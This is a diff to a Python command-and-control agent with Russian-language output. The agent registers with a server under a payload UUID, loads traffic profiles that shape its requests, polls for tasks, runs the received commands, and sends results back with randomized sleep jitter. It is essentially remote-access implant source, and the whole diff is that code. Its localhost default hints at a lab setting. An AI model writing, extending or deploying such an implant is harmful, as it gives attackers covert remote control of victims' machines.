@@ -5,11 +5,13 @@ import socket
 import subprocess
 import time
 from pathlib import Path
+from uuid import UUID
 import psutil
 import requests
+from profiles import PROFILES, validate_profile
 
 SERVER_URL = os.environ.get("BOT_SERVER", "http://127.0.0.1:5000")
-PAYLOAD_UUID = os.environ.get("BOT_PAYLOAD", "550e8400-e29b-41d4-a716-446655440000")
+PROFILE_NAME = os.environ.get("BOT_PROFILE", "standard")
 SLEEP = float(os.environ.get("BOT_SLEEP", "5"))
 JITTER = float(os.environ.get("BOT_JITTER", "0.3"))
 
@@ -43,25 +45,48 @@ def next_sleep(sleep=SLEEP, jitter=JITTER):
     return max(0.1, delay)
 
 
-def checkin():
-    response = requests.post(
-        f"{SERVER_URL}/checkin",
-        json={"payload_uuid": PAYLOAD_UUID},
-        timeout=5
-    )
+def load_config():
+    if PROFILE_NAME not in PROFILES:
+        raise ValueError("BOT_PROFILE должен быть standard или mixed")
+    path = Path(os.environ.get("BOT_CONFIG", str(
+        Path(__file__).with_name(f"payload-{PROFILE_NAME}.json"))))
+    if path.exists():
+        config = json.loads(path.read_text(encoding="utf-8"))
+        if config.get("server_url") != SERVER_URL:
+            raise ValueError("В конфиге другой сервер. Выбери новый файл BOT_CONFIG")
+    else:
+        response = requests.post(f"{SERVER_URL}/payloads",
+                                 json={"profile": PROFILE_NAME}, timeout=5)
+        response.raise_for_status()
+        config = response.json()
+        config["server_url"] = SERVER_URL
+        validate_profile(config["profile"])
+        UUID(config["payload_uuid"])
+        path.parent.mkdir(parents=True, exist_ok=True)
+        path.write_text(json.dumps(config, ensure_ascii=False, indent=2), encoding="utf-8")
+    validate_profile(config["profile"])
+    UUID(config["payload_uuid"])
+    print("Конфиг:", path, "Payload:", config["payload_uuid"], flush=True)
+    return config
+
+
+def profile_request(endpoint, operation, data, config):
+    rule = config["profile"][operation]
+    options = build_request(endpoint, rule, data)
+    options["headers"] = {"X-Payload-UUID": config["payload_uuid"]}
+    print(rule["method"], endpoint, rule["transport"], rule["field"], flush=True)
+    response = requests.request(**options)
     response.raise_for_status()
-    data = response.json()
+    return response.json()
+
+
+def checkin(config):
+    data = profile_request("/checkin", "checkin", config["payload_uuid"], config)
     return data["callback_uuid"]
 
 
-def get_task(callback_uuid):
-    response = requests.post(
-        f"{SERVER_URL}/poll",
-        json={"callback_uuid": callback_uuid},
-        timeout=5
-    )
-    response.raise_for_status()
-    return response.json()["task"]
+def get_task(callback_uuid, config):
+    return profile_request("/poll", "get_task", callback_uuid, config)["task"]
 
 
 def execute(command):
@@ -83,21 +108,17 @@ def execute(command):
     raise ValueError("дай норм команду")
 
 
-def send_result(callback_uuid, task_id, result):
-    response = requests.post(
-        f"{SERVER_URL}/results",
-        json={"callback_uuid": callback_uuid, "task_id": task_id, "result": result},
-        timeout=5
-    )
-    response.raise_for_status()
+def send_result(callback_uuid, task_id, result, config):
+    data = {"callback_uuid": callback_uuid, "task_id": task_id, "result": result}
+    profile_request("/results", "post_task", data, config)
 
 
-def run(callback_uuid):
+def run(callback_uuid, config):
     pending = None
     while True:
         try:
             if pending is None:
-                task = get_task(callback_uuid)
+                task = get_task(callback_uuid, config)
                 if task is not None:
                     print("Задача:", task["task_id"], task["command"], flush=True)
                     try:
@@ -107,7 +128,7 @@ def run(callback_uuid):
                     pending = {"task": task, "result": result[:20000]}
             if pending is not None:
                 task = pending["task"]
-                send_result(callback_uuid, task["task_id"], pending["result"])
+                send_result(callback_uuid, task["task_id"], pending["result"], config)
                 print("Отдал результат:", task["task_id"], flush=True)
                 if task["command"] == "exit":
                     print("Вышел", flush=True)
@@ -125,12 +146,13 @@ def run(callback_uuid):
 
 if __name__ == "__main__":
     try:
-        callback_uuid = checkin()
+        config = load_config()
+        callback_uuid = checkin(config)
         print("ЮИД:", callback_uuid, flush=True)
-        run(callback_uuid)
+        run(callback_uuid, config)
     except requests.RequestException as error:
         print("Не смог зарегистрироваться:", error)
-    except (KeyError, ValueError) as error:
-        print("Сервер прислал непонятный ответ:", error)
+    except (KeyError, ValueError, TypeError, AttributeError, OSError) as error:
+        print("Ошибка конфига или ответа сервера:", error)
     except KeyboardInterrupt:
         print("\nОстановил")
